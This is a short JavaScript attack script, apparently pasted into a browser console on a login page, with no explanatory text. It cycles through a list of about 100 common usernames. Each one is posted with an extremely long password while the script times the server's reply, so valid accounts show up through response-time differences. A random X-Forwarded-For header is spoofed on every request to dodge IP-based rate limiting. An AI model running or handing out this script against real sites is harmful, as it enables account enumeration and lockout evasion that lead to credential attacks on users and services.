const usernames = [
    "root",
    "admin",
    "test",
    "guest",
    "info",
    "adm",
    "mysql",
    "user",
    "administrator",
    "oracle",
    "ftp",
    "pi",
    "puppet",
    "ansible",
    "ec2-user",
    "vagrant",
    "azureuser",
    "academico",
    "acceso",
    "access",
    "accounting",
    "accounts",
    "acid",
    "activestat",
    "ad",
    "adam",
    "adkit",
    "admin",
    "administracion",
    "administrador",
    "administrator",
    "administrators",
    "admins",
    "ads",
    "adserver",
    "adsl",
    "ae",
    "af",
    "affiliate",
    "affiliates",
    "afiliados",
    "ag",
    "agenda",
    "agent",
    "ai",
    "aix",
    "ajax",
    "ak",
    "akamai",
    "al",
    "alabama",
    "alaska",
    "albuquerque",
    "alerts",
    "alpha",
    "alterwind",
    "am",
    "amarillo",
    "americas",
    "an",
    "anaheim",
    "analyzer",
    "announce",
    "announcements",
    "antivirus",
    "ao",
    "ap",
    "apache",
    "apollo",
    "app",
    "app01",
    "app1",
    "apple",
    "application",
    "applications",
    "apps",
    "appserver",
    "aq",
    "ar",
    "archie",
    "arcsight",
    "argentina",
    "arizona",
    "arkansas",
    "arlington",
    "as",
    "as400",
    "asia",
    "asterix",
    "at",
    "athena",
    "atlanta",
    "atlas",
    "att",
    "au",
    "auction",
    "austin",
    "auth",
    "auto",
    "autodiscover"
]

let formData = new FormData()
const superLongPasswd = "oo8gAfRtRXP7NuIcsXCL2vdpxBrIPnIOU1638M5eEjh1jTJljJQZbLJQKoXmqmKpl3fuYdizcja1Lpcx8XexlBHI3yYqgCK2TlRGbrV10NSO8KAsQqqNpKuQVDN6IJwyuvRTlzB7w7A9ELBjNRYAMtIMiA5zEBg2PGz71snbD3ulBSk929jw01QgsWNxJOu1ghRs69JcLovAEzDO2c0A7S5mF09qVyCOwmRpbQxc58Y0OOECOP9haHtz3YtIwAOm4cZYruZ9YMrCTzTOEExLlDukzhwRPs457cA96C2OXGHbVpyaghbp2A46wFzdwseJPR8AVifouagbgLh20k4RI2qgLrRJ1ylQ3owYldCrWsvVdZYhkEAVLh7Ye6LoUQDCKsPjDat6pfqz6DvxVN5ooMx2mEMBaa62i5x9BUK483F9XVaYSLPCQyjLmg685zo46GsZpxqzFCdlFbJQXtU5YlkYIRR22oJ7UJ2KXJGPZUznu6cfWIY5xiXusVPxSnOBslt2AKrIGna4k2ToxUvxsgf9uxSlddbZHTPf36HV32MIPehykZmoasYbr890MRY8sjijS7vm9NXXg0bbHmd3h6Fqvuwt1CC38JyrYjH9ssWhytTXSJWZrLTToUGeFxq22DwNiqNRq0teVj5naAQ6maniuzmI5iazK3kTsT4zSkLjDAomCbtfWlUeD5KEeO3pYRB2AyMQGBei9QBXnCMmJPfPLKXAjCYiPrN92IV7nVyCOtB3JxApeZ8gueKhI9KG9M0GfOlawPGkQ5bz3fEph4ePyzXE1JVORMLfR0HPkKeF0l1SODf0ksqYEPzzH9rt7oDyUPuP7KQthPx0JlieXoAh9EckCwZdABNMoJNRB3MfjmFWoZu2SeA9DMiCWr6URY4ZhWo2CXyuy6DUgNkGUgJpxfX9sW9BkSECx0NGC912H7IeV12HloCzWH3tTWBPjAplrNCS06xNDoTo5CBdyMLQqKkDxHsnozdwt6ci"
formData.set("password", superLongPasswd)

const url = window.location.href

let responseTime = []

for(let i = 0; i < usernames.length; i++) {
    const username = usernames[i];
    formData.set("username", username)
    const sendTime = new Date().getTime()
    responseTime.push(
        fetch(url, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Forwarded-For': Math.floor(Math.random() * 10000000000) + 1
            }
        })
        .then((res) => {
            const receivedTime = new Date().getTime()
            return receivedTime - sendTime
        })    
    )
}

responseTime = await Promise.all(responseTime)
console.log(responseTime)
